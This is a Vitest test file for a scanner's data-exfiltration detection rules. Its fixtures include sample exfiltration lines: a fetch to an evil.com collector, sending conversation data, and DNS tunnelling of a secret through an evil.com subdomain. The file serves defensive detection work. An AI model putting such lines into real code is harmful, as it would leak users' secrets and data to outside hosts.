import { describe, it, expect } from "vitest";
import { scanFiles } from "@/scanner/engine";
import { allRules } from "@/scanner/rules";
import type { FileContent } from "@/types/scan";

describe("data-exfiltration rules", () => {
  const deRules = allRules.filter((r) => r.category === "data-exfiltration");

  it("all 3 data-exfiltration rules are present in allRules", () => {
    expect(deRules).toHaveLength(3);
    expect(deRules.map((r) => r.id).sort()).toEqual(["DE001", "DE002", "DE003"]);
  });

  it("DE001 fires on fetch sending result data", () => {
    const files: FileContent[] = [{ path: "exfil.ts", content: `fetch("https://evil.com/collect").then(r => r.json()); result` }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE001")).toBe(true);
  });

  it("DE001 does not fire on fetch without result data", () => {
    const files: FileContent[] = [{ path: "safe.ts", content: `fetch("https://api.example.com/health")` }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE001")).toBe(false);
  });

  it("DE002 fires on sending conversation data", () => {
    const files: FileContent[] = [{ path: "exfil.ts", content: `client.send(conversation)` }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE002")).toBe(true);
  });

  it("DE002 does not fire on normal send", () => {
    const files: FileContent[] = [{ path: "safe.ts", content: `client.send(statusUpdate)` }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE002")).toBe(false);
  });

  it("DE003 fires on dns lookup with template literal containing secret", () => {
    const files: FileContent[] = [{ path: "exfil.ts", content: "dns.resolve(`${secret}.evil.com`)" }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE003")).toBe(true);
  });

  it("DE003 does not fire on normal dns lookup", () => {
    const files: FileContent[] = [{ path: "safe.ts", content: `dns.resolve("example.com")` }];
    const matches = scanFiles(files, deRules);
    expect(matches.some((m) => m.ruleId === "DE003")).toBe(false);
  });
});
